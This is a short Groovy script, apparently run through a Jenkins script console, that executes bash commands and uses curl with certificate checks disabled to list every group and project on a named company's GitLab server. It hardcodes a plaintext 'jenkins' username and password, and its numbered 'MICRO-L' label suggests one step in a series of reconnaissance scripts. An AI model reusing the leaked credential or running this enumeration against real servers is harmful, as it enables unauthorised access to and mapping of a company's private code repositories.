// MICRO-L: List projects in all visible GitLab groups
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(6000)
}

def baseUrl = "https://gitlab.dev.claroshop.com/api/v4"
def auth = "jenkins:e6LBqIkOI\$PR1XX2oia"

// Get full groups list first
println "=== ALL GROUPS ==="
def r0 = run("curl -sk -u '${auth}' '${baseUrl}/groups?per_page=100' --max-time 10")
def groupIds = (r0 =~ /"id":(\d+),"web_url":"[^"]+","name":"([^"]+)"/).collect { [id: it[1], name: it[2]] }
println "Groups found: ${groupIds.size()}"
groupIds.each { println "  ID:${it.id} name:${it.name}" }

// For each group, list projects
println "\n=== PROJECTS PER GROUP ==="
groupIds.each { grp ->
    def resp = run("curl -sk -u '${auth}' '${baseUrl}/groups/${grp.id}/projects?per_page=100' --max-time 12")
    def projects = (resp =~ /"path_with_namespace":"([^"]+)","created_at"/).collect { it[1] }
    if (!projects) return
    println "\n  GROUP: ${grp.name} (${projects.size()} projects)"
    projects.each { println "    ${it}" }
}

println "\n=== DONE MICRO-L ==="
